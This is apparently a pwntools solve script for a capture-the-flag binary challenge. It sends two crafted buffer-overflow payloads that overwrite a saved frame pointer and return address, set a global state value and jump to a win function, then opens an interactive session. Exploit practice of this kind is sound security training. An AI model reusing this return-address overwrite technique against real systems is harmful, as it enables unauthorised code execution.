from pwn import *

NAME = 'chall/chall'
URL  = 'chall.lac.tf'
PORT = 31593
FLAGFILE = 'flag.txt'

context.binary = ELF(NAME)

TERMINAL_CONFIG = ['tmux','split-window', '-h', '-F', '#{pane_pid}', '-P']
context.binary = ELF(NAME)
context.terminal = TERMINAL_CONFIG

GDB_COMMAND = f'''
break fgets
break *0x4011d6
break *0x4012ea
continue
'''
ENV = {}

def create_flag(flag_path):
  write(flag_path, 'THIS_IS_THE_FLAG' * 4 + '\n')

create_flag(FLAGFILE)

if args['REMOTE']:
  log.warning('This challenge requires that you start the remote instance.\n'
        'Ensure that the domain and port used in this script with '
        'the remote instance')
  p = remote(URL, PORT)
elif args['GDB']:
  create_flag(FLAGFILE)
  p = gdb.debug(context.binary.path, gdbscript=GDB_COMMAND, env=ENV)
else:
  create_flag(FLAGFILE)
  p = process(context.binary.path, env=ENV)

state_addr = 0x404540
vuln_fgets = 0x004012c1
win_addr = 0x4011d6

PAYLOAD = (b'1' * 0x20) + p64(state_addr + 0x20) + p64(vuln_fgets)
PAYLOAD = PAYLOAD[:-1]
assert(b'\n' not in PAYLOAD)

state_val = 0xf1eeee2d
sizeofstate = 4

PAYLOAD2 = p32(state_val) + (b'1' * (0x20-sizeofstate)) + (b'1' * 8) + p64(win_addr)
PAYLOAD2 = PAYLOAD2[:-1]
assert(b'\n' not in PAYLOAD2)

p.recvline()
p.send(PAYLOAD)

p.recvline()
p.send(PAYLOAD2)
p.interactive()